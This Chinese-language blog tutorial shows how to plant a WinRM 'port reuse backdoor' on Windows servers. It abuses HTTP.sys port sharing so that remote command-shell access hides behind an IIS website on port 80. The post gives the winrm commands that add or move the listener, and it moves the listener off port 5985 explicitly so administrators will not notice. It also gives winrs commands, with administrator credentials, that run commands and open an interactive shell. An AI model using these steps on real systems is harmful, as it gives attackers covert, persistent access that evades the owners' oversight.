**目录**

[WinRM端口复用原理](#t0 "WinRM端口复用原理")

[端口复用配置](#t1 "端口复用配置")

[新增80端口监听](#t2 "新增80端口监听")

[修改WinRM默认监听的端口](#t3 "修改WinRM默认监听的端口")

[远程连接WinRM](#t4 "远程连接WinRM")

* * *

WinRM端口复用原理
-----------

该端口复用的原理是使用Windows的远程管理服务WinRM，结合 HTTP.sys 驱动自带的端口复用功能，一起实现正向的端口复用后门。

关于WinRM服务，传送门：[WinRM远程管理工具的使用](https://xie1997.blog.csdn.net/article/details/105122945 "WinRM远程管理工具的使用") 

而HTTP.sys驱动是[IIS](https://so.csdn.net/so/search?q=IIS&spm=1001.2101.3001.7020)的主要组成部分，主要负责HTTP协议相关的处理，它有一个重要的功能叫Port Sharing(端口共享)。所有基于HTTP.sys驱动的HTTP应用都可以共享同一个端口，只需要各自注册的URL前缀不一样。而WinRM就是在HTTP.sys上注册了 wsman 的URL前缀，默认监听 5985端口。因此，在安装了IIS的Windows服务器上，开启WinRM服务后修改默认监听端口为80或新增一个80端口的监听即可实现端口复用，通过Web端口登录Windows服务器。

使用 netsh http  show  servicestate 命令可以查看所有在 HTTP.sys 驱动上注册过的URL前缀。

![](https://img-blog.csdnimg.cn/20200430163822821.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

端口复用配置
------

### 新增80端口监听

对于Windows Server 2012以上的服务器操作系统中，WinRM服务默认启动并监听了5985端口。如果服务器本来就监听了80和5985端口，则所以我们既需要保留原本的5985监听端口，同时需要新增Winrm监听80端口。这样的话，WinRM同时监听80和5985端口。既能保证原来的5985端口管理员可以正常使用，我们也能通过80端口远程连接WinRM。

通过下面的命令，可以新增WinRM一个80端口的监听。

```
winrm set winrm/config/service @{EnableCompatibilityHttpListener="true"}
```


![](https://img-blog.csdnimg.cn/20200430220436316.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200430220630643.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

查看监听端口，80和5985都在监听

![](https://img-blog.csdnimg.cn/20200430220830297.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

80端口仍然可以正常访问网页

![](https://img-blog.csdnimg.cn/20200430222322913.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 修改WinRM默认监听的端口

如果该计算机上原本没有开启WinRM服务的话，则需要将WinRm端口监听端口修改为80端口。不然管理员看到该机器开起来5985端口的话，肯定会起疑心。

```
快速启动WinRM      
winrm  quickconfig  -q      
修改WinRM默认端口为80      
winrm set winrm/config/Listener?Address=*+Transport=HTTP @{Port="80"}
```


![](https://img-blog.csdnimg.cn/20200430223406718.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

查看监听端口，只有80，没有5985

![](https://img-blog.csdnimg.cn/20200430223453411.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

配置完成之后，原本的HTTP服务可以正常访问，我们也可以通过80端口进行远程WinRM连接管理。

![](https://img-blog.csdnimg.cn/20200430222358864.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

远程连接WinRM
---------

本地需要连接WinRM服务时，首先也需要配置启动WinRM服务。如果是工作组环境的话，还需要设置信任连接的主机，执行以下两条命令即可。

```
winrm quickconfig -q      
winrm set winrm/config/Client @{TrustedHosts="*"}
```


![](https://img-blog.csdnimg.cn/20200430224358939.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

```
通过WinRM连接，并执行whoami命令      
winrs -r:http://192.168.10.20 -u:administrator -p:root whoami       
通过WinRM连接，并获得交互式的shell      
winrs -r:http://192.168.10.20 -u:administrator -p:root cmd
```


![](https://img-blog.csdnimg.cn/20200430221313874.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

 如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！[知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具](https://wx.zsxq.com/dweb2/index/group/88514121251242 "知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具")

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)

参考文章：[一条命令实现端口复用后门](https://paper.seebug.org/1004/?utm_medium=referral&utm_source=tuicool "一条命令实现端口复用后门")